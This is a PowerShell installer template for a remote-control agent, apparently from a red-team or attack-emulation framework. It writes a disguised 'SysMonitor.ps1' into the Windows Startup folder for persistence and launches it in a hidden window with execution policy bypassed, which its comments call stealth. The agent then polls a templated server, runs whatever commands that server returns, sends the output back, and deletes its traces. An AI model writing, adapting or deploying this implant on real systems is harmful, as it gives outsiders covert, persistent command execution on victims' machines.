$server = "{{ server_url }}"
$installPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SysMonitor.ps1"

# The actual agent code that will run in the background
$agentCode = @"
`$server = '$server'
`$hostname = `$env:COMPUTERNAME

while (`$true) {
    try {
        # Ensure the agent itself is in a stable directory
        Set-Location "C:\" -ErrorAction SilentlyContinue

        `$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        `$checkinPayload = @{ 
            hostname = `$hostname; 
            os = 'win';
            is_privileged = `$isAdmin 
        } | ConvertTo-Json
        `$resp = Invoke-RestMethod -Uri "`$server/api/checkin" -Method POST -ContentType 'application/json' -Body `$checkinPayload

        if (`$resp.status -eq 'task') {
            `$cmd = `$resp.command
            `$stdout = ""
            `$stderr = ""
            `$exitCode = 0
            
            # Create isolated task directory
            `$taskDir = Join-Path `$env:TEMP ("atomic-task-" + [Guid]::NewGuid().ToString().Substring(0,8))
            New-Item -ItemType Directory -Path `$taskDir -Force | Out-Null

            try {
                # Execute in the isolated task directory
                `$proc = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command `$cmd" -NoNewWindow -PassThru -WorkingDirectory `$taskDir -RedirectStandardOutput "`$taskDir\out.txt" -RedirectStandardError "`$taskDir\err.txt"
                `$proc.WaitForExit()
                `$exitCode = `$proc.ExitCode
                `$stdout = Get-Content "`$taskDir\out.txt" -Raw -ErrorAction SilentlyContinue
                `$stderr = Get-Content "`$taskDir\err.txt" -Raw -ErrorAction SilentlyContinue
            } catch {
                `$stderr = `$_.Exception.Message
                `$exitCode = -1
            } finally {
                # Guaranteed cleanup of task artifacts
                Remove-Item -Recurse -Force `$taskDir -ErrorAction SilentlyContinue
            }

            `$resultPayload = @{ 
                hostname = `$hostname; 
                exit_code = `$exitCode;
                output = `$stdout;
                stderr = `$stderr
            } | ConvertTo-Json
            Invoke-RestMethod -Uri "`$server/api/results" -Method POST -ContentType 'application/json' -Body `$resultPayload | Out-Null
        }
    } catch {
        # Keep polling alive even if server is down
    }
    Start-Sleep -s 5
}
"@

# 1. Write the agent to the Startup folder (Persistence)
try {
    Set-Content -Path $installPath -Value $agentCode -Force
} catch {
    # Fallback if Startup folder is restricted
    $installPath = "$env:TEMP\SysMonitor.ps1"
    Set-Content -Path $installPath -Value $agentCode -Force
}

# 2. Execute it in the background invisibly (Stealth)
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$installPath`""